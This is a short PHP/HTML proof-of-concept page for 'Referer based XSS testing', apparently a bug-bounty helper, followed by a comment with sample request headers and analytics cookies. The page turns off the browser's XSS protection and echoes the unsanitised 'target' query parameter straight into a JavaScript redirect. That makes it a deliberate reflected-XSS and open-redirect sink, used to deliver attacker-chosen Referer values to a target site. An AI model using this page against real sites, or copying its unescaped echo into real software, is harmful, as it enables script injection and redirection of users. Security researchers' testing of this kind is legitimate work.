<!-- //Example of IT -->

<?php header('X-XSS-Protection: 0'); ?>
<!DOCTYPE html>
<html>
<head>
<title>Referer based XSS testing</title>
</head>
<body>
<script>window.location.replace('<?php echo $_GET['target']; ?>'); </script>
</body>
</html>

<!-- Request Headers

Host: p0c.geekboy.ninja
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://p0c.geekboy.ninja/rxss.php/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Cookie: _gid=GA1.2.886626192.1759840420; _ga=GA1.2.613916396.1759840420; _ga_EYJ8RV7JDE=GS2.1.s1759902092$o4$g1$t1759903154$j53$l0$h0
Content-Length: 0 -->

